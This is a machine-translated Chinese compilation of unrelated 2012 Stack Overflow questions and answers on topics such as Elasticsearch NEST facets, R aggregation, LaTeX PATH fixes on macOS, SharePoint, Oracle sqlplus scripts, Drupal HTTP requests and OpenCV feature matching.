> 标签：c#, elasticsearch, nest

我需要一种方法来控制构建方面，而无需仅使用 Nest fluent api。主要需要是我可能需要包含或排除 allterms 或 facetfilters。

下面的代码有效，但要更改方面，我需要重新编译。我看到它需要一个 Func 但我无法返回正确的类型来使其正常工作。

```
 sd.FacetTerm("Name", t => t 
            .OnField("Field")
            .Size(facet.Size)
            .AllTerms()
        ); 
```

下面的代码不起作用，我知道为什么。调试时，我看到它创建了方面术语，但没有“FacetBuilder”提供的任何数据。

```
 sd.FacetTerm(facet.Name, t => FacetBuilder(options));

    public TermFacetDescriptor<CatalogMapping> FacetBuilder(FacetOptions options)
    {
        var facet = new TermFacetDescriptor<CatalogMapping>();
        facet.OnField(options.Field);

        facet.Size(options.Size);
        if (options.IncludeAllTerms)
            facet.AllTerms();

        return facet;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:10:44.793

需要传递对象引用并修改该实例。

```
public TermFacetDescriptor<CatalogMapping> FacetBuilder(TermFacetDescriptor<CatalogMapping> termFacet, FacetOptions options)
    {
        termFacet.OnField(options.Field);
        termFacet.Size(options.Size);

        if (options.IncludeAllTerms)
            termFacet.AllTerms();

        return termFacet;
    } 
```

# r - 将汇总值表与“父”数据集中的汇总变量相结合

> ID：13916268
> 
> 赞同：3
> 
> 时间：2012-12-17T14:43:01.753
> 
> 标签：r

我有一个沿着这些方向的数据集：

```
df<-data.frame(sp=c(100, 100, 100, 101, 101, 101, 102, 102, 102),
type=c("C","C","C","H","H","H","C","C","C"),
country=c("A", "A", "A", "B", "B", "B", "C", "C", "C"),
vals=c(1,2,3,4,5,6,7,8,9)
) 
```

我想聚合 df$vals 并将其他变量也通过

目前我正在这样做：

```
multi.func<- function(x){
c(
n = length(x),
min = min(x, na.rm=TRUE),
max = max(x, na.rm=TRUE),
mean = mean(x, na.rm=TRUE)
)}

aggVals<-as.data.frame(do.call(rbind, by(df$vals, df$sp, FUN=multi.func, simplify=TRUE)))
aggVals$sp<-row.names(aggVals)

aggDescrip<-aggregate(cbind(as.character(type), as.character(country)) ~ sp, data=df, FUN=unique)

result<-merge(aggDescrip,aggVals) 
```

这工作得很好，但我想知道是否有更简单的方法。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:51:10.623

也许你应该看看这个`data.table`包。

```
library(data.table)
DT <- data.table(df, key="sp")
DT[, list(type = unique(as.character(type)), 
          country = unique(as.character(country)), 
          n = .N, min = min(vals), max = max(vals), 
          mean = mean(vals)), by=key(DT)]
#     sp type country n min max mean
# 1: 100    C       A 3   1   3    2
# 2: 101    H       B 3   4   6    5
# 3: 102    C       C 3   7   9    8 
```

* * *

如果您想坚持使用基本 R，这里是另一种可能有用的方法（尽管`aggregate`可能更常见）：

```
unique(within(df, {
    mean <- ave(vals, sp, FUN=mean)
    max <- ave(vals, sp, FUN=max)
    min <- ave(vals, sp, FUN=min)
    n <- ave(vals, sp, FUN=length)
    rm(vals)
}))
#    sp type country n min max mean
# 1 100    C       A 3   1   3    2
# 4 101    H       B 3   4   6    5
# 7 102    C       C 3   7   9    8 
```

* * *

### 更新：您最初尝试的变化

如果可能的话，我建议坚持使用`data.table`，因为生成的代码很容易理解并且聚合过程很快。

但是，通过一些修改，您可以拥有（又一种）更直接的基本 R 方法。

首先，修改您的函数，以便使用而不是`c()`使用`data.frame`。此外，添加一个参数来指定需要聚合的列。

```
multi.func <- function(x, value_column) {
    data.frame(
        n = length(x[[value_column]]),
        min = min(x[[value_column]], na.rm=TRUE),
        max = max(x[[value_column]], na.rm=TRUE),
        mean = mean(x[[value_column]], na.rm=TRUE))
} 
```

其次，`lapply`在您的数据集`split`上使用您的分组变量，`merge`将输出与您的原始数据集一起使用，然后返回`unique`值。

```
unique(merge(df[-4], 
             do.call(rbind, lapply(split(df, df$sp), 
                                   multi.func, value_column = "vals")),
             by.x = "sp", by.y = "row.names")) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:10:18.227

仅使用`aggregate`：

```
result <- aggregate(vals ~ type + sp + country, df, 
    function(x) c(length(x), min(x), max(x), mean(x))
)

result
  type  sp country vals.1 vals.2 vals.3 vals.4
1    C 100       A      3      1      3      2
2    H 101       B      3      4      6      5
3    C 102       C      3      7      9      8

colnames(result)
[1] "type"    "sp"      "country" "vals" 
```

* * *

以上似乎创建了一个奇怪的“多值”列。但从包`summaryBy`中`doBy`类似于`aggregate`但将允许具有多列的输出：

```
library(doBy)
result <- summaryBy(vals ~ type + sp + country, df, 
    FUN=function(x) c(n=length(x), min=min(x), max=max(x), mean=mean(x))
)

result
  type  sp country vals.n vals.min vals.max vals.mean
1    C 100       A      3        1        3         2
2    C 102       C      3        7        9         8
3    H 101       B      3        4        6         5

colnames(result)
[1] "type"      "sp"        "country"   "vals.n"    "vals.min"  "vals.max" 
[7] "vals.mean" 
```

# actionscript-3 - 为什么我的第二个加载的子应用程序在 FlexEvent.INITIALIZE 之后停止

> ID：13916270
> 
> 赞同：2
> 
> 时间：2012-12-17T14:43:09.877
> 
> 标签：actionscript-3, flex4, mxml

我有一个 Flex 4 应用程序，它使用 mx.controls.SWFLoader 组件将 Flex 4 应用程序加载到其中。我多次加载相同的 swf-subapp，因为每个子应用程序也独立运行，并且子应用程序的内容由我通过加载程序上下文传递给它的 XML 确定。

这一直有效，直到最近，但现在，我第二次加载相同的 swf（使用不同的 xml）时，加载的 swf 在触发 FlexEvent.INITIALIZE 后停止执行任何操作（我在初始化的事件处理程序中没有做任何事情）。换句话说，我没有收到 CreationComplete 事件，这是我开始编写代码的地方（更糟糕的是，也没有错误）。

由于我一直在处理我的主应用程序的不同部分，我不太记得是哪个更改使我的项目崩溃了，但我记得的是我更新了我的 Flex SDK，并且我遇到了类似的静默错误较早的 SDK 升级。

在我的主应用程序中，我在加载新的 swf 之前自己进行了清理，所以它不应该是垃圾。

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T09:05:34.440

解决了。

有一个 enterframe 处理程序将 swf 的第一个实例保存在内存中，它以某种方式阻止了下一个实例的加载（尽管我在父容器上使用了 removeAllElements 并希望可以解决问题）。

现在我使用 NativeSignal 并从 onRemove 处理程序（RobotLegs）上删除所有侦听器。奇迹般有效。

# java-me - 代号存储中的读写对象

> ID：13916271
> 
> 赞同：2
> 
> 时间：2012-12-17T14:43:13.267
> 
> 标签：java-me, storage, lwuit, codenameone

我正在开发一个基于代号的 j2me 应用程序。我实现了一些代码，现在我想将数据库添加到我的应用程序中。经过大量搜索，我发现了代号为一个的存储类，它简化了移动应用程序中的数据库概念。

在这个应用程序中，我为每个实体（如人、城市……）创建一个类，并添加“读取”和“写入”方法来读取和写入数据。

一些实体类有 2 个或更多字段。所以我必须用 Storage 类保存和阅读它们。

我怎样才能做到这一点？

这是我的示例代码：

```
package com.x.database;

import com.codename1.io.Storage;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Iterator;

public class Person {

    public Person(){
    }
    public Person(int pID, String pPersonNumber){
        ID = pID;
        PersonNumber = pPersonNumber;
    }

    public static String PERSON = "Person";

    private Storage store;
    private int ID;

    public int getID(){
        return ID;
    }

    public void setID(int pID){
        ID = pID;
    }

    private String PersonNumber;

    public String getPersonNumber(){
        return PersonNumber;
    }

    public void setPersonNumber(String pPersonNumber){
        PersonNumber = pPersonNumber;
    }

    public int getLastKeyNumber(){
        if(store == null) {
            store = Storage.getInstance();
        }

        Hashtable depHash = (Hashtable)store.readObject(PERSON);
        ArrayList<String> keyArray = (ArrayList<String>)depHash.keys();

        int i = 0;
        for (Iterator<String> it = keyArray.iterator(); it.hasNext();) {
            int tmp = Integer.parseInt(it.next());
            i = i < tmp ? tmp : i;
        }

        return i;
    }

    public void write(Person pPerson){
        if(store == null) {
            store = Storage.getInstance();
        }

        if(!store.exists(PERSON)) {
            Hashtable depHash = new Hashtable();
            try {
                depHash.put("0", pPerson);
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
            store.writeObject(PERSON, depHash);
        }
        else {
            Hashtable depHash = (Hashtable)store.readObject(PERSON);

            ArrayList<Person> depArray = (ArrayList<Person>)depHash.keys();

            for (Iterator<Person> it = depArray.iterator(); it.hasNext();) {
                Person tmp = it.next();

                if(!tmp.getPersonNumber().equals(pPerson)) {
                    depHash.put(String.valueOf(getLastKeyNumber()), pPerson.getPersonNumber());
                    store.writeObject(Person depHash);
                }
            }
        }
    }

    public ArrayList<Person> readAll(){
        Storage store = Storage.getInstance();

        if(!store.exists(PERSON)) {
            Hashtable depHash = (Hashtable)store.readObject(PERSON);

            return (ArrayList<Person>)depHash.elements();
        }
        return new ArrayList<Person>();
    }
} 
```

在这段代码中，我在存储上写入和读取对象时出错。

如何在 Storage 中写入一个对象并再次读取它？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T10:18:19.427

您可以将 a`Vector`或 a`Hashtable`存储在 storage 中，并将它们嵌套到您喜欢的深度，例如：

```
Vector v = new Vector();
Hashtable content = new Hashtable();
content.put("A", ...);
content.put("B", ...);
v.addElement(content); 
```

等等...您可以添加更多哈希值，它们可以包含字符串、数字或字节数组。

或者，您可以实现 Codename One Externalizable 接口，该接口允许您将任意类写入存储。但是，这提出了一个要求，您需要调用`Util.register`以注册可外部化的类名。提示者演示中有一个示例。

# macos - 升级到 OSX 10.8.2 后“latex: command not found”

> ID：13916273
> 
> 赞同：5
> 
> 时间：2012-12-17T14:43:14.703
> 
> 标签：macos, latex, latex-suite

我已经在我的 mac (10.7.?) 上使用 vim-latex 套件几个月了，没有任何问题。周末，我将操作系统升级到 10.8.2，现在我的 tex 文件无法编译。编译命令

```
\ll 
```

在 vim 中不会产生错误，但不会产生 pdf 文件。如果我在终端中拖放到命令行，则以下命令

```
latex document.tex 
```

生产

```
-bash: latex: command not found 
```

同样，对于 pdflatex。我不确定这是否是路径错误，或者是否需要重新安装 10.8.2 的乳胶。我不确定在这两种情况下如何进行。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-10T03:20:09.593

我有同样的问题并输入：

```
export PATH=/usr/texbin:$PATH 
```

似乎在外壳中工作正常。虽然如果我打开一个新的 shell 它不再起作用，但这是重新下载和重新安装巨大的 MacTeX 程序的更快的解决方案。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-10-20T14:02:09.957

这发生在我升级到 OS X El Capitan 后。我在`/usr/local/texlive/2014/bin/x86_64-darwin`. 所以，我只是将它添加到我的 .bashrc

```
export PATH="$PATH:/usr/local/texlive/2014/bin/x86_64-darwin" 
```

无需重新安装。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T16:55:25.407

在 OS X 上，第三方安装程序将目录添加到路径的标准方法是将文件放在`/etc/paths.d`. TeXLive 将其作为安装的一部分进行，但操作系统升级可能将其吹走。

您应该能够在该目录下创建一个仅包含一行的新文件，即包含 TeX 可执行文件的目录的路径。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2021-07-01T07:44:00.547

通过@petew 的答案设置路径时，`/usr/local/texlive/2014/bin/x86_64-darwin`可能不是正确的版本。在我的系统`/usr/local/texlive/2021/bin/universal-darwin`上是需要的。确保检查您的 texlive 二进制文件以查看您下载的文件。

# sharepoint - Sharepoint 2010 上的激活解决方案不可见

> ID：13916274
> 
> 赞同：0
> 
> 时间：2012-12-17T14:43:20.653
> 
> 标签：sharepoint, deployment, solution

我已经激活了一个包含网站模板的 WSP 文件。这可行，我可以在解决方案库中看到解决方案。当我尝试基于该模板创建网站时，它没有显示出来。但它显示“状态：已激活”。

然后我尝试停用它并再次手动激活它。突然间，出现了一个新模板，该模板的名称为我的模板名称后加了一个“2”。

那么这里到底发生了什么？激活我的解决方案的代码是：

```
System.IO.MemoryStream input = new System.IO.MemoryStream(System.IO.File.ReadAllBytes(rootDirectory + "\\Templates\\Project.wsp"), true);

SPDocumentLibrary solutionGallery = (SPDocumentLibrary)web.Site.GetCatalog(SPListTemplateType.SolutionCatalog);

try
{
 SPFile solutionFile = solutionGallery.RootFolder.Files.Add("Project.wsp", input);
 SPUserSolution newUserSolution = web.Site.Solutions.Add(solutionFile.Item.ID);
}
catch { ... } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T15:09:49.990

好的，我自己找到了答案，并想在这里分享。解决方法是，不提供目录中的解决方案，还要启用功能！它是这样工作的：

```
System.IO.MemoryStream input = new System.IO.MemoryStream(System.IO.File.ReadAllBytes(rootDirectory + "\\Templates\\Project.wsp"), true);

SPDocumentLibrary solutionGallery = (SPDocumentLibrary)web.Site.GetCatalog(SPListTemplateType.SolutionCatalog);

try
{
 SPFile solutionFile = solutionGallery.RootFolder.Files.Add("Project.wsp", input);
 SPUserSolution newUserSolution = web.Site.Solutions.Add(solutionFile.Item.ID);

 Guid solutionId = newUserSolution.SolutionId;

 SPFeatureDefinitionCollection siteFeatures = web.Site.FeatureDefinitions;
 var features = from SPFeatureDefinition f
             in siteFeatures
             where f.SolutionId.Equals(solutionId) && f.Scope == SPFeatureScope.Site
             select f;
 foreach (SPFeatureDefinition feature in features)
 {
  try
  {
   web.Site.Features.Add(feature.Id, false, SPFeatureDefinitionScope.Site);
  }
  catch { }
 }

 SPWebTemplateCollection webTemplates = web.Site.RootWeb.GetAvailableWebTemplates(1033);
 SPWebTemplate webTemplate = (from SPWebTemplate t
                           in webTemplates
                           where t.Title == "Projekt"
                           select t).FirstOrDefault();
 if (webTemplate != null)
 {
  try
  {
   web.Site.RootWeb.ApplyWebTemplate(webTemplate.Name);
  }
  catch { }
 }
}
catch { ... } 
```

# shell - 通过 shell 脚本连接到远程 Oracle 服务器

> ID：13916276
> 
> 赞同：1
> 
> 时间：2012-12-17T14:43:20.460
> 
> 标签：shell, unix, oracle10g, oracle11g

我是 shell 脚本的新手。我有一个远程的 Oracle 服务器说“Oracle1”并监听端口 1521 我试图通过 shell 脚本远程连接到它。我在设置环境变量时遇到了一些问题。我的剧本是。

```
ORACLE_SID=wctest98;
export ORACLE_SID
ORACLE_HOME=Oracle1.com:1521/opt/oracle/oracle11g/product/11.2.0;
export ORACLE_HOME
PATH=$ORACLE_HOME/bin:$PATH;
export PATH
SQLPATH=$ORACLE_HOME/sqlplus/admin;
export SQLPATH

sqlplus -s /NOLOG << EOF
connect wcadmin/wcadmin@Oracle1.com:1521/wctest98
select * from dual;
exit

EOF 
```

我收到“ **sqlplus：未找到**”错误。我是第一次这样做。我已连接到本地 Oracle 系统，但未连接到远程服务器。随意编辑...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:49:07.780

您的`ORACLE_HOME`（下）对我来说看起来不正确。它不应包含您的 oracle 服务器的主机和端口。

```
ORACLE_HOME=Oracle1.com:1521/opt/oracle/oracle11g/product/11.2.0/bin; 
```

ORACLE_HOME 是您在本地计算机上安装 Oracle 客户端的任何位置的路径。例如，它可能是：

```
ORACLE_HOME=/opt/oracle/oracle11g/product/11.2.0 
```

检查您是否`sqplus`在`${ORACLE_HOME}/bin`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T14:45:26.077

似乎 sqlplus 不在您的 PATH 变量中。

你可以看看它是否与

```
which sqlplus 
```

并找到它在哪里

```
locate sqlplus 
```

在你的路径中添加一些东西

```
export PATH=$PATH:/path/to/sqlplusdir/ 
```

# rss - 如何获得我的 reddit 保存的 RSS 提要？

> ID：13916277
> 
> 赞同：-1
> 
> 时间：2012-12-17T14:43:21.623
> 
> 标签：rss, reddit

最终，我尝试使用 IFTTT 将我保存在 reddit 上的图片传输到谷歌驱动器，这样我就可以将它们用作我的随机桌面图片。我找到了这个 IFTTT 食谱：[https](https://ifttt.com/recipes/55843) ://ifttt.com/recipes/55843 ，但我不确定如何获取我的 reddit 保存的 rss 提要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T20:17:57.140

访问[此页面](https://ssl.reddit.com/prefs/feeds/)，您将看到“您保存的链接”的私人 RSS 源的链接。用那个。

# javascript - extjs 3.4 在渲染之前获取进度条 html 表示

> ID：13916279
> 
> 赞同：0
> 
> 时间：2012-12-17T14:43:32.530
> 
> 标签：javascript, extjs, progress-bar

我想知道在任何地方呈现进度条之前是否有任何方法可以获取进度条的 html 表示？

我需要在网格中渲染进度条。至于现在我将自定义渲染器用于进度列：

```
renderer: function( value, metaData, record, rowIndex, colIndex, store ) {
                var id = Ext.id();
                (function(){
                    var progress = new Ext.ProgressBar({
                        renderTo: id,
                        value: progress_value
                    });
                }).defer(50);
                return '<div id="'+ id + '"></div>';
            } 
```

但它看起来对用户不友好，因为进度条是在渲染网格之后渲染的。

我认为可以使用此功能创建自定义进度条，因为可以看到呈现为 html 的模板源代码，但我认为它并不那么优雅。

我认为最好的方法是创建这样的函数：

```
var generateRenderer = (function(){
        var pb = new Ext.ProgressBar();
        return function( progress_value ){
            pb.updateValue( progress_value );
            return pb.htmlRepresentationFunction();
        }
    })(); 
```

`htmlRepresentationFunction()`返回 html represetation 的函数在哪里（从它的名称可以明显看出）。然后`generateRenderer()`在自定义渲染器中使用函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T10:24:06.067

至于现在，我已经以这种方式重写了代码：

```
progressBarHtmlGenerator: (function(){
    var width = progress_width,
        cls = 'x-progress', // it's default class from ext.js
        tpl = new Ext.Template( // this template is from ProgressBar.js in ext.js
            '<div class="{cls}-wrap">',
                '<div class="{cls}-inner">',
                    '<div class="{cls}-bar" style="width: {barWidth}px">',
                        '<div class="{cls}-text">',
                            '<div>{text}</div>',
                        '</div>',
                    '</div>',
                    '<div class="{cls}-text {cls}-text-back">',
                        '<div>{textBack}</div>',
                    '</div>',
                '</div>',
            '</div>'
        );
    return function(value, text, textBack){
        return tpl.apply({
            cls: cls,
            barWidth: value*width || 0,
            text: text || '&#160;',
            textBack: textBack || '&#160;'
        })
    }
})() 
```

这个模板来自 ProgressBar.js。然后我在我的自定义渲染器中使用这个函数，如下所示：

```
renderer: function( value, metaData, record, rowIndex, colIndex, store ) {
                var value = progress_value;
                return this.progressBarHtmlGenerator(value);
            }.createDelegate(this) 
```

因此，因为我不需要动画它可以工作，但我仍然希望有一些比这更优雅的方式。

# c++ - 处理多端口服务器

> ID：13916282
> 
> 赞同：1
> 
> 时间：2012-12-17T14:43:38.513
> 
> 标签：c++, networking, network-programming

我必须编写一个服务器，它必须在他们指定的端口上接受客户端。
示例：`A`想在端口 1337 上连接，因此服务器在端口 1337`B`上侦听。在 1992 上，因此服务器在 1992 上侦听，等等...

我不知道如何处理这个。我是否应该制作一个类似的系统：
- 所有客户端都连接在同一个端口上：XXXX；
- 客户的第一个数据包指定他想要的端口；
- 服务器在新端口上绑定/侦听/接受；
- 服务器回答客户端没问题；
- 客户端停止连接 XXXX 端口并开始连接新端口。
我不知道这种系统好不好，但我不知道该怎么做。
谢谢你，弗洛里安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:14:53.180

您将需要某种主进程或中央表来保留端口映射的空间。您首先需要客户端连接到主进程或某种“入口房间”才能连接。然后，当他们从一个房间移动到另一个房间时，只需查找他们需要连接的端口，并将他们引向下一个端口。如果需要，所有中央信息都可以保存在数据库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:48:22.970

如果客户要传达有关其他端口的请求，您将需要至少打开一个标准端口以供客户端连接。它不必明显打开，它可以像某些`ssh`隐藏系统那样安静地接受 UDP 数据包。如果您愿意产生某种新端口已绑定并准备就绪的响应，它也可以与 TCP 一起使用。

无论如何，如果你有正确的框架，监听多个端口并不是特别棘手。[libevent](http://libevent.org/)是您如何开始的一个示例。

不过，您会打开一个标准端口以及未知数量的动态端口，这似乎很奇怪。你什么时候关闭这些？他们最终会超时吗？听电话本质上只是短期的吗？

# javascript - 使用 libxmljs (Node.js) 将子节点添加到 XML 文件

> ID：13916286
> 
> 赞同：0
> 
> 时间：2012-12-17T14:43:51.363
> 
> 标签：javascript, node.js, libxml2

我正在尝试将新的子节点添加到 xml 文件中；到目前为止，我有这个代码：

```
var libxml = require('libxmljs');
var xml =  '<?xml version="1.0" encoding="UTF-8"?>' +
           '<root>' +
               '<child foo="bar">' +
                   '<grandchild baz="fizbuzz"><blah>grandchild content</blah></grandchild>' +
               '</child>' +
               '<child foo="bar1">' +
                   '<grandchild baz="fizbuzz">grandchild content 1</grandchild>' +
               '</child>' +
               '<child foo="bar3">' +
                   '<grandchild baz="fizbuzz3">grandchild content 3</grandchild>' +
               '</child>' +
               '<sibling>with content!</sibling>' +
           '</root>';

var xmlDoc = libxml.parseXml(xml);
var allxml = xmlDoc.root();  //store all nodes as allxml
var allNodes = xmlDoc.childNodes(); //all child nodes to array
var elem = xmlDoc.node('name1');
var newChild = libxml.Element(xmlDoc, 'new-child');
elem.addChild(newChild); 
```

但是当我运行它时出现以下错误：

```
return this._root(elem);
            ^
Error: Holder document already has a root node 
```

有谁知道这里发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T09:06:32.397

您的问题是 xmlDoc.node()。在文档上，此方法尝试创建一个新的根节点。你想要的是 xmlDoc.root() 返回当前的根节点。不过，此代码示例还有其他问题。请参阅文档[https://github.com/polotek/libxmljs/wiki](https://github.com/polotek/libxmljs/wiki)

# https - 如何使用 drupal_http_request 构造 https POST 请求？

> ID：13916287
> 
> 赞同：3
> 
> 时间：2012-12-17T14:43:51.243
> 
> 标签：https, drupal-7, http-headers

我想向 https 服务器发送 POST 请求。

```
$data = 'name=value&name1=value1';

$options = array(
  'method' => 'POST',
  'data' => $data,
  'timeout' => 15,
  'headers' => array('Content-Type' => 'application/x-www-form-urlencoded'),
);

$result = drupal_http_request('http://somewhere.com', $options); 
```

我无法弄清楚在上面的 POST 示例代码中实现 https 选项。

谁能解释一下我该怎么做？我对使用 Drupal 进行 PHP 编码非常陌生，我绝对可以使用该指南。

我发现只需要在协议中设置它。所以我得到了这个代码。

```
$data = 'access_token=455754hhnaI&href=fb&template=You have people waiting to play with you, play now!';

$options = array(
  'method' => 'POST',
  'data' => $data,
  'timeout' => 15,
  'headers' => array('Content-Type' => 'application/x-www-form-urlencoded'),
);

$result = drupal_http_request('https://graph.facebook.com/1000721/notifications?', $options); 
```

它仍然不起作用。如果我通过 Firefox 发布`https://graph.facebook.com/1000080521/notifications?access_token=45575FpHfhnaI&href=fb&template=You have people waiting to play with you, play now!`它可以工作。

我可能没有在 Drupal 中正确构建请求。

我究竟做错了什么？我怎样才能让我的代码工作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-18T06:42:55.330

`drupal_http_request()`使用安全连接 (https://) 或不使用安全连接 (http://)没有区别。

PHP 必须在支持 OpenSSL 的情况下编译；否则，`drupal_http_request()`不支持安全连接。除此之外，唯一的问题可能是代理服务器不支持安全连接。

作为旁注，您将`https://graph.facebook.com/1000721/notifications?`用作请求的 URL。问号不应是 URL 的一部分。

我还将使用[drupal_http_build_query()](http://api.drupal.org/api/drupal/includes!common.inc/function/drupal_http_build_query/7)来构建用于请求的数据。

```
$data = array(
  'access_token' => '455754hhnaI',
  'href' => 'fb',
  'template' => 'You have people waiting to play with you, play now!'
);

$options = array(
  'method' => 'POST',
  'data' => drupal_http_build_query($data),
  'timeout' => 15,
  'headers' => array('Content-Type' => 'application/x-www-form-urlencoded'),
);

$result = drupal_http_request('https://graph.facebook.com/1000721/notifications', $options); 
```

# ios - appStore：为仍在开发中的应用程序预先获取 iOS 应用程序名称

> ID：13916293
> 
> 赞同：1
> 
> 时间：2012-12-17T14:44:16.110
> 
> 标签：ios, app-store

我不确定这是否是解决这个问题的正确网站 - 它不是技术性的 - 或者它可能是。

我可以将“占位符”应用程序上传到 appStore 以获取我喜欢的名称，然后在“真实”应用程序完成后更新它吗？

我想知道iOS应用程序名称是否唯一？

以及更新是否应该与原始提交有关？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:51:08.947

你可以去itunesconnect新建一个appID，然后根据appID新建一个应用。您必须根据需要上传一些空白图像和一些虚拟文本。然后它会告诉您该名称是否可用。如果你得到了这个名字，你有六个月的时间上传一个二进制文件，然后这个名字就被释放了。如果之后需要更多时间，您可以上传不完整的二进制文件，提交它，然后拒绝该二进制文件。这可以给你更多的时间。

# image-processing - 在 OpenCV 中检测对象并进行实时比较

> ID：13916296
> 
> 赞同：7
> 
> 时间：2012-12-17T14:44:29.863
> 
> 标签：image-processing, opencv, computer-vision

我们正在制造一个自主机器人（在大学活动中），它遵循某些标志和方向并通过定向路线。机器人将在头部安装一个摄像头。它将跟随在它前面的道路上或墙壁上绘制的标志，并据此做出决定。标志将是绿色箭头（用于 GO 信号），或红色 T 作为停止标志。机器人将实时扫描这些符号并执行必要的操作。这些标志可以直接在前面的墙上，也可以画在前面的路上。

我曾尝试寻找必要的图像变换算法或方法，但我们对这个领域还很陌生。我就如何解决这个问题以及可能对我们有帮助的必要代码寻求您的帮助（假设我们是初学者）。

我已经研究了以下线程，但我很困惑： - [OpenCV 对象检测 - 中心点](https://stackoverflow.com/questions/279410/opencv-object-detection-center-point) -[如何识别此图像中的矩形？](https://stackoverflow.com/questions/1817442/how-to-recognize-rectangles-in-this-image) - [http://www.chrisevansdev.com/computer-vision-opensurf.html](http://www.chrisevansdev.com/computer-vision-opensurf.html)（我无法使用它）

该事件给出的提示之一是，我们可以将箭头建模为矩形和三角形，以找出三角形的中心是否在该矩形的右侧（这意味着向右走）或其他位置。对于 T 也是如此。

谢谢！:)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T08:28:28.177

如果标志是先前已知的，您可以使用“通过特征检测识别对象”的方法。

这个想法是你有一个标志的图片（箭头或 T），你执行以下**训练步骤，离线**：

1 - 特征检测（使用，SURF，FAST，...）

2 - 使用 SIFT、FREAK 等进行描述符提取（从特征中）...

然后是实时部分。对于每一帧，您必须执行特征检测和描述符提取，但随后您需要对训练图像进行匹配以查看您得到的对象。一个可以实时工作的例子：

```
cv::FAST detector;
cv::FREAK descriptor;
BFMatcher matcher = BFMatcher(NORM_HAMMING,false);

detector.detect(frame,keypoints_frame);
descriptor.compute(frame, keypoints_frame,descriptors_frame);
matcher.match(descriptors_trainning, descriptors_frame); 
```

这将是匹配的第一种方法，然后您需要优化和删除异常值。有些技术是

*   比率测试

*   交叉检查

*   RANSAC + 单应性

这里有一个完整的[例子](http://docs.opencv.org/doc/tutorials/features2d/feature_homography/feature_homography.html#feature-homography)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-18T05:36:18.503

我假设您可以在活动开始前获得标志：拿箭头标志，然后从他那里获得“筛选描述符”并将它们存储在您的机器人中。

然后在机器人获取的每一帧中寻找标志的颜色，当你看到类似于标志的东西时，筛选描述符并尝试在存储的描述符和新的描述符之间进行注册。如果成功，请尝试计算原始存储符号与您在图像上找到的符号之间的旋转和平移矩阵。

要阅读有关 sift 的信息，我建议在此站点上： [http](http://aishack.in/tutorials/sift-scale-invariant-feature-transform-introduction/) ://aishack.in/tutorials/sift-scale-invariant-feature-transform-introduction/ 在您了解 sift 的基础知识后，我建议您下载一些实现自己实现，这是一项非常乏味的工作，并且有很多陷阱

顺便说一句，虽然 sift 是“比例不变特征变换”，但我很确定它也适用于你的情况，即使你也有“透视变换”。

希望它有所帮助

# javascript - 部署节点应用程序时出现heroku错误

> ID：13916302
> 
> 赞同：0
> 
> 时间：2012-12-17T14:44:43.967
> 
> 标签：javascript, node.js, heroku

我正在尝试将应用程序部署到heroku。到目前为止一切正常......我不知道我做了什么，但每次我开始这个过程时，我都会收到这个错误，

```
2012-12-17T14:36:42+00:00 heroku[web.1]: State changed from up to starting
2012-12-17T14:36:42+00:00 heroku[slugc]: Slug compilation finished
2012-12-17T14:36:44+00:00 heroku[web.1]: Stopping all processes with SIGTERM
2012-12-17T14:36:46+00:00 heroku[web.1]: Process exited with status 1
2012-12-17T14:36:47+00:00 heroku[web.1]: State changed from starting to crashed
2012-12-17T14:36:47+00:00 heroku[web.1]: State changed from crashed to starting
2012-12-17T14:36:48+00:00 heroku[web.1]: Starting process with command `node app.js`
2012-12-17T14:36:49+00:00 app[web.1]: module.js:340
2012-12-17T14:36:49+00:00 app[web.1]:           ^
2012-12-17T14:36:49+00:00 app[web.1]: 
2012-12-17T14:36:49+00:00 app[web.1]:     throw err;
2012-12-17T14:36:49+00:00 app[web.1]: Error: Cannot find module './proto'
2012-12-17T14:36:49+00:00 app[web.1]:     at Function.Module._resolveFilename (module.js:338:15)
2012-12-17T14:36:49+00:00 app[web.1]:     at Function.Module._load (module.js:280:25)
2012-12-17T14:36:49+00:00 app[web.1]:     at Module.require (module.js:362:17)
2012-12-17T14:36:49+00:00 app[web.1]:     at require (module.js:378:17)
2012-12-17T14:36:49+00:00 app[web.1]:     at Object.<anonymous> (/app/node_modules/express/node_modules/connect/lib/connect.js:14:13)
2012-12-17T14:36:49+00:00 app[web.1]:     at Object.Module._extensions..js (module.js:467:10)
2012-12-17T14:36:49+00:00 app[web.1]:     at Module._compile (module.js:449:26)
2012-12-17T14:36:49+00:00 app[web.1]:     at Module.load (module.js:356:32)
2012-12-17T14:36:49+00:00 app[web.1]:     at Function.Module._load (module.js:312:12)
2012-12-17T14:36:49+00:00 app[web.1]:     at Module.require (module.js:362:17) 
```

任何人？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-24T23:44:30.663

嗯，我认为您正在尝试使用自己的文件，这句话是：

```
require('./proto'); 
```

您的 proto.js 文件是否在同一目录中？似乎是找不到那个模块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-07T21:15:08.387

这是猫鼬版本的问题

* * *

## 回答 #3

> 赞同：-1
> 
